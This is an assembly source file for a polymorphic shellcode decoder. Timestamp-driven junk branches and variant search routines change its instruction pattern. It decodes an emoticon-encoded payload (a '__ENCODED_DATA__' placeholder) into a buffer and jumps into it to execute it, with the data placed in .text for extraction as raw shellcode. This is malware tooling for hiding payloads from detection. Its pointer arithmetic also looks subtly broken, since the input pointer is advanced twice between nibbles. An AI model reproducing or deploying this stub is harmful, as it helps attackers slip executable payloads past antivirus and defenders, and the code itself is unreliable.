.intel_syntax noprefix
.section .text
.global decoder_entry
# --- PROLOGUE_INSERT ---
decoder_entry:

    cld

    # ---- polymorphic entry junk ----
    rdtsc
    xor eax, edx
    test al, 1
    jz path_A
    jmp path_B

path_A:
    xchg r14, r14
    push r14
    pop r14
    jmp init

path_B:
    xor r14, r14
    add r14, 0
    jmp init

# ----------------------------------
init:
    lea r13, [rip + encoded_data]
    lea r15, [rip + outbuf]
    lea r11, [rip + keywords]

main_loop:

    mov al, [r13]
    test al, al
    je finish

    cmp al, ' '
    je skip_sep

    call decode_nibble
    mov bl, al
    shl bl, 4

    inc r13

    call decode_nibble
    or bl, al

    mov [r15], bl
    add r15, 1

    jmp main_loop

skip_sep:
    add r13, 1
    jmp main_loop

finish:
    lea rax, [rip + outbuf]
    jmp rax

# ==================================================
# POLYMORPHIC decode_nibble
# ==================================================
decode_nibble:

    push rbx
    push rcx
    push rdx
    push rsi

    # runtime variant selection
    push rax
    push rdx
    rdtsc
    and eax, 1
    mov r8d, eax
    pop rdx
    pop rax

    mov al, [r13]
    mov cl, [r13+1]
    mov dl, [r13+2]

    xor rsi, rsi

    test r8d, r8d
    jz search_variant_A
    jmp search_variant_B

# ================= VARIANT A =================
search_variant_A:
.loop_A:
    cmp rsi, 15
    ja .not_found

    lea rdi, [rsi + rsi*2]
    xor r9, r9
    mov bl, [r11 + rdi]
    cmp al, bl
    jne .next_A
    mov bl, [r11 + rdi + 1]
    cmp cl, bl
    jne .next_A
    mov bl, [r11 + rdi + 2]
    cmp dl, bl
    jne .next_A

    mov eax, esi
    jmp .done

.next_A:
    inc rsi
    jmp .loop_A

# ================= VARIANT B =================
search_variant_B:
.loop_B:
    cmp rsi, 15
    ja .not_found

    mov rdi, rsi
    shl rdi, 1
    add rdi, rsi
    inc r9
    mov bl, [r11 + rdi + 2]
    cmp dl, bl
    jne .next_B
    mov bl, [r11 + rdi + 1]
    cmp cl, bl
    jne .next_B
    mov bl, [r11 + rdi]
    cmp al, bl
    jne .next_B

    mov eax, esi
    jmp .done

.next_B:
    add rsi, 1
    jmp .loop_B

.not_found:
    xor eax, eax

.done:
    add r13, 3

    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

# ==================================================
# DATA (inside .text for easy objcopy)
# ==================================================
keywords:
    .ascii "UwUOwOTwT>w<^w^QwQPwPRwRSwSVwVXwXYwYZwZNwNMwMLwL"

encoded_data:
    .asciz "__ENCODED_DATA__"

outbuf:
    .space 4096